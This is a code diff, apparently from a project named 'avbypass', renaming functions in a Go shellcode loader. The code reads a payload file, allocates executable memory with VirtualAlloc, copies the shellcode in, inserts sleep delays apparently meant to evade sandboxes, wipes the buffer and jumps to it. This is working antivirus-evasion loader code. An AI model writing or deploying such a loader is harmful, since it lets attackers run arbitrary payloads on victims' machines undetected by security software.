@@ -57,25 +57,25 @@ func checkError(err error) {
 	}
 }
 
-func genEXE(charcode []byte) {
+func jiazaiexe(charcode []byte) {
 
 	addr, _, err := VirtualAlloc.Call(0, uintptr(len(charcode)), MEM_COMMIT|MEM_RESERVE, PAGE_EXECUTE_READWRITE)
 	if addr == 0 {
 		checkError(err)
 	}
-	gd()
+	delay()
 
 	_, _, err = RtlMoveMemory.Call(addr, (uintptr)(unsafe.Pointer(&charcode[0])), uintptr(len(charcode)))
 	checkError(err)
 
-	gd()
+	delay()
 	for j := 0; j < len(charcode); j++ {
 		charcode[j] = 0
 	}
 	syscall.Syscall(addr, 0, 0, 0, 0)
 }
 
-func gd() int64 {
+func delay() int64 {
 	time.Sleep(time.Duration(2) * time.Second)
 
 	dd := time.Now().UTC().UnixNano()
@@ -93,10 +93,10 @@ func getFileShellCode(file string) []byte {
 
 
 func main() {
-	bbdata:=getEncode(string(getFileShellCode("E:\\githubproject\\avbypass\\payload.bin")))
-	fmt.Println(bbdata)
-	//bbdata:=""
-	shellCodeHex := getDeCode(bbdata)
-	gd()
-	genEXE(shellCodeHex)
+	endata:=getEncode(string(getFileShellCode("E:\\githubproject\\avbypass\\payload.bin")))
+	fmt.Println(endata)
+	//endata:=""
+	shellCodeHex := getDeCode(endata)
+	delay()
+	jiazaiexe(shellCodeHex)
 }
